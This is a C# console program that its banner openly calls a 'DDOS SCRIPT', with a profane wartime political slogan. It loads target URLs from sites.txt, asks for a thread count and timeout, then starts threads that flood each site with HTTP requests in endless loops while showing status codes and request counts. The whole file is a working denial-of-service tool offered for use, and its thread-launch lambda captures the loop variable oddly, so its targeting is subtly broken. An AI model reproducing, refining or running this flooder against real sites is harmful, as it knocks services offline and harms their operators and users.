using System;
using System.IO;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using System.Collections.Generic;

namespace ddos
{
    class Site
    {
        private string _site;
        private int _status_code;
        private int _request_counter;

        public Site(string site)
        {
            _site = site;
            _status_code = 0;
            _request_counter = 0;
        }

        public void SetStatusCode(int status_code)
        {
            if (status_code / 100 >=1 && status_code / 100 < 10)
            {
                _status_code = status_code;
            }
        }

        public void AddRequest()
        {
            _request_counter++;
        }

        public int GetStatusCode()
        {
            return _status_code;
        }

        public string GetSite()
        {
            return _site;
        }

        public int GetRequestCounter()
        {
            return _request_counter;
        }

        public override string ToString()
        {
            return _site;
        }
    }

    class Program
    {
        static int _counter = 0;
        static int _request_timeout = -1;
        static Site[] _site_list;

        static void ShowBaner()
        {
            Console.Clear();
            Print("РУССКИЙ ВОЕННЫЙ КОРАБЛЬ, ПОШЕЛ НАХУЙ! (DDOS SCRIPT) /fun_banana/\n",ConsoleColor.Red);
            Print("\t                               /##%((##                #//#                      ");
            Print("\t                               #&#%&%#####(            &/(&                      ");
            Print("\t                               #%.  ./&&&&#.       %&#//(#%#%&#.#                ");
            Print("\t                               #&                  ./@%(#%%%&*.  ,#/             ");
            Print("\t                          /%%%@&%@%%%%#              ,@%&&&&,       ,%           ");
            Print("\t                        ##(#%%#(##&##%@           #####&&&&###########@%###%#*   ");
            Print("\t                      .@##&&####%&#&*.        /#((#########(##(###(######%&.     ");
            Print("\t                      ,&##&&####%@#%#/      #####. /#(###### .*#######%&(,       ");
            Print("\t                        ,&&&&&&&&&&&&&@   ,#(#######/.....,(%#######%&,          ");
            Print("\t                      .#######@&%@###### (#(######. ,(( /(( ,(#####%&,           ");
            Print("\t                    #(###%%######%%#%%%, #&#(#####   ,, ...  (####%&&            ");
            Print("\t                 ,####%%%#####&%%##&/.   #&#######,/* , ,..(.(#####%&#           ");
            Print("\t               #**&###%&######&%###@,    #&%####/ %#(/#/##/##.,(#####&@.         ");
            Print("\t            .#,  .&&##%&######&%###%%%#   ,&######################((##%&&##      ");
            Print("\t          #*.      ,@%%%%&%%%%%&&&&&&&&@    ,&&%%%%%%%%%%%%%%%%%%%%%%%%%%%%&#*   ");
            Print("\t       .#,           .,,,,,,,,@((&,,##,,,    #*,,,,,,,,&((&,,%&&&@&@@&@@&@&&&&###");
            Print("\t     #*, @(,,,/////////////////////@, ,%  ,&%//(%#%%%%%&((&#%&&%#%%%%%%%%%%%%%%%@");
            Print("\t  ,#,    ,,,*&#&**&#&**&#&//@#&##&#&,   ,((,@&&&&&&&&&&&%%@&&&&&@#@&%@#&&&@#&&&@ ");
            Print("\t .*&%//(%%%&%**,,,,****************@%/    .,@#&&((&%%&&%%&&&@*,*,,,********,,,*@ ");
            Print("\t    ,,,,,,,%&&&%%%%%%%%%%%%%%%%%%%(*,,*#%##%@&@&%%@&&&@%%%%*,(#&&&&&&&&&&&&&&&&, ");
            Print("\t              @&&&&&&&&&&&&&&&&&&&@#/**********************(&&&&&&&&&&&&&&&&&&@  ");
            Print("\t               @%%%%###%#&,*#.&%###%&&&&&&&&&&&&&&&&&&&&&%%&%##%&,(%&&&(#&%#%%@  ");
            Print("\t                %&&&&&&&&@%#,%@&&&&&&#,///(&&&&&&&&&#,///(&&&&&&@,&&%%@//&&&&(   ");
            Print("\t                 .&%%%%@.@&#.&&**&#&*/&#%&%*@#%%##&//@#%&#*&%%%%&%(///#%&&#&,.   ");
            Print("\t                   .&%%#%&/,.,%&&%#@//@&&&&/&%##%#&/(@&&&%/@%###%%%&&&%%%%@.     ");
            Print("\t                     .*&&%#&%&%%%%%%%&&&&&&%%%%%%%%%&&&&&&&%%%%%&%%%%%%&(.       ");
            Print("\t                        .&&&%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%&&&.          ");
            Print("\t                            .,......................................             ");
        }
        
        static void ShowBanerUA()
        {
            Console.Clear();
            Print("РУССКИЙ ВОЕННЫЙ КОРАБЛЬ, ПОШЕЛ НАХУЙ! (DDOS SCRIPT)               /fun_banana/\n\n",ConsoleColor.Red);
            Print("          WNXKKKXXNW                  NKK0000dcc:,,;dX                          ", ConsoleColor.Blue);
            Print("       WKOxc:;;;::coxk0NWW          WKo;;;,;;,,,,,,,;xN                         ", ConsoleColor.Blue);
            Print("       Xo,,,,,,,,,,,,,;cdxddkOxOXKKXXd,,,,,,,,,,,,,,;dN                         ", ConsoleColor.Blue);
            Print("       W0c,,,,,,,,,,,,,,,,,,,,,;::;:lc,,,,,,,,,,,,,,,cdkk0N                     ", ConsoleColor.Blue);
            Print("        Nd,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,:xN                    ", ConsoleColor.Blue);
            Print("      WXOl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,c0NNW  WXXN           ", ConsoleColor.Blue);
            Print("    W0dc;,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,clcoxxoc:dXNNNW      ", ConsoleColor.Blue);
            Print("  WKd:,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,:lccodkOXNW", ConsoleColor.Blue);
            Print(" W0c,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,:ld", ConsoleColor.Blue);
            Print(" Nk:,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,;o", ConsoleColor.Blue);
            Print("Kd:,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,lO", ConsoleColor.Blue);
            Print("l,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,:k", ConsoleColor.Blue);
            Print("d:;;;;;;;;;;;;;;;;;;;;:c:;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;l", ConsoleColor.Blue);
            Print("WX00OOkkkkkkkkkkkkO0KKXXX0OOkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk0", ConsoleColor.Yellow);
            Print("     WWWNNNXXXNNNW         WNNXK00000000000000000000000000000000000000000KXNNWWW", ConsoleColor.Yellow);
            Print("           WW                 NK0000000000000000000000000000000000000000KNW     ", ConsoleColor.Yellow);
            Print("                              WXKK00000000000000000000000000000000000KKKXW      ", ConsoleColor.Yellow);
            Print("                               WXK000000000KK000000000000000000000KKXNWWW       ", ConsoleColor.Yellow);
            Print("                                WNK000000KKKKK000000000000000KKXXNNWW           ", ConsoleColor.Yellow);
            Print("                             WWWWNXK0KXNNNNNXXKK0000000000KKXNW                 ", ConsoleColor.Yellow);
            Print("                             NKKKKK0KNW    WNXKKKKKKKKXXXXNWW                   ", ConsoleColor.Yellow);
            Print("                           WNKK00KKXNW        WWWWWNXKKXXNW                     ", ConsoleColor.Yellow);
            Print("                          WXKK0KXNWW           WNXXKK0000KXNW WWWWW             ", ConsoleColor.Yellow);
            Print("                          NXXXNNNW             WNXKK000000KKXNXKKXW             ", ConsoleColor.Yellow);
            Print("                                                 WWNX0000KKKXNNNNW              ", ConsoleColor.Yellow);
            Print("                                                   WX00KXNWWW                   ", ConsoleColor.Yellow);
            Print("                                                   WXKKXW                     \n", ConsoleColor.Yellow);
        }

        static int[] GetAllThreads()
        {
            int max, max2;
            ThreadPool.GetMaxThreads(out max, out max2);
            int available, available2;
            ThreadPool.GetAvailableThreads(out available, out available2);
            return new int[] {max - available, max2 - available2};
        }

        static void ShowInfo()
        {
            if (_site_list == null)
            {
                Print($"ERROR geting info", ConsoleColor.Red);
                return;
            }

            Console.SetCursorPosition(0, 0);
            Print($"Total requests:\t[{_counter}] | Total threads: [{GetAllThreads()[0]}]\n");

            for (int i = 0; i < _site_list.Length; i++)
            {
                int status_code = _site_list[i].GetStatusCode();
                int status_code_type = status_code / 100;
                int request_counter = _site_list[i].GetRequestCounter();
                switch (status_code_type)
                {
                    case 2:
                        Print($"[ + ] [{status_code}]\t[{request_counter}]\t { _site_list[i]}", ConsoleColor.Green);
                        break;

                    case 3:
                        Print($"[ + ] [{status_code}]\t[{request_counter}]\t { _site_list[i]}", ConsoleColor.Yellow);
                        break;

                    case 4:
                        Print($"[ * ] [{status_code}]\t[{request_counter}]\t { _site_list[i]}", ConsoleColor.Yellow);
                        break;
                    
                    case 5:
                        Print($"[ - ] [{status_code}]\t[{request_counter}]\t { _site_list[i]}", ConsoleColor.Red);
                        break;

                    default:
                        Print($"[ # ] [{status_code}]\t[{request_counter}]\t { _site_list[i]}", ConsoleColor.DarkGray);
                        break;
                }
            }
        }

        static void Print(string text, ConsoleColor color = ConsoleColor.White, bool is_line = true)
        {
            Console.ForegroundColor = color;

            if (is_line)
            {
                Console.WriteLine(text);
            }
            else
            {
                Console.Write(text);
            }

            Console.ResetColor();
        }

        static void SendRequest(int id)
        {
            if (_site_list.Length <= id || id < 0)
            {
                return;
            }
            Site site = _site_list[id];
            WebRequest request = WebRequest.Create(_site_list[id].GetSite());
            if (_request_timeout > 0)
            {
                request.Timeout = _request_timeout;
            }

            try
            {
                WebResponse response = request.GetResponse();
                HttpWebResponse httpResponse = (HttpWebResponse)response;
            }
            catch
            {
                
            }
            _counter++;
            _site_list[id].AddRequest();
        }

        static void UpdateInfo(int id)
        {
            while (true)
            {
                SendRequest(id);
            }
        }

        static async Task UpdateStatusCode(int id)
        {
            if (_site_list.Length <= id || id < 0)
            {
                return;
            }
            Site site = _site_list[id];
            WebRequest request = WebRequest.Create(_site_list[id].GetSite());
            try
            {
                WebResponse response = await request.GetResponseAsync();
                HttpWebResponse httpResponse = (HttpWebResponse)response;
                _site_list[id].SetStatusCode((int)httpResponse.StatusCode);
            }
            catch (WebException e)
            {
                using (WebResponse response = e.Response)
                {
                    HttpWebResponse httpResponse = (HttpWebResponse)response;
                    try 
                    {
                        _site_list[id].SetStatusCode((int)httpResponse.StatusCode);
                    }
                    catch
                    {
                        _site_list[id].SetStatusCode(500);
                    }
                }
            }
        }

        static async void StartUpdatingStatusCode()
        {
            while(true)
            {
                var tasks = new List<Task>();
                for (int id = 0; id < _site_list.Length; id++)
                {
                    tasks.Add(UpdateStatusCode(id));
                }
                await Task.WhenAll(tasks);
            }
        }

        static Site[] GetSitesList()
        {
            if (!File.Exists(("sites.txt")))
            {
                return null;
            }
            try
            {
                string[] sites_string = File.ReadAllLines("sites.txt");
                Site[] result = new Site[sites_string.Length];

                for (int i = 0; i < sites_string.Length; i++)
                {
                    result[i] = new Site(sites_string[i]);
                }

                return result;
            }
            catch 
            {
                return null;
            }
        }

        static void Main(string[] args)
        {
            int threads_max = 0;

            ShowBanerUA();

            Print("Uploading sites from sites.txt\n");

            _site_list = GetSitesList();

            if (_site_list == null)
            {
                Print("ERROR uploading sites from sites.txt", ConsoleColor.Red);
                return;
            }
            Print($"Sites was uploaded [{_site_list.Length}]\n",ConsoleColor.Green);

            foreach(Site site in _site_list)
            {
                Print($"[ * ] {site}");
            }


            Print("\nPlease enter the number of threads you want: ", is_line: false);
            string res = Console.ReadLine();

            while(threads_max == 0)
            {
                try 
                {
                    threads_max = int.Parse(res);
                }
                catch
                {
                    Print("ERROR Please enter an integer number",ConsoleColor.Red);
                    Print("\nPlease enter the number of threads you want: ", is_line: false);
                    res = Console.ReadLine();
                }
            }


            Print("\nPlease enter timeout of each request. if you want set unlimited timeout enter [ 0 ]: ", is_line: false);
            res = Console.ReadLine();

            while(_request_timeout == -1)
            {
                try 
                {
                    _request_timeout = int.Parse(res);
                }
                catch
                {
                    Print("ERROR Please enter an integer number",ConsoleColor.Red);
                    Print("\nPlease enter timeout of each request (in miliseconds). if you want set unlimited timeout enter [ 0 ]: ", is_line: false);
                    res = Console.ReadLine();
                }
            }


            Console.Clear();

            for (int i = 0; i < threads_max; i++)
            {
                for (int id = 0; id < _site_list.Length; id++)
                {
                    Thread thr = new Thread(() => UpdateInfo(id-1));
                    thr.Start();
                }
            }

            Thread thread = new Thread(() => StartUpdatingStatusCode());
            thread.Start();

            while(true)
            {
                ShowInfo();
            }
        }
    }
}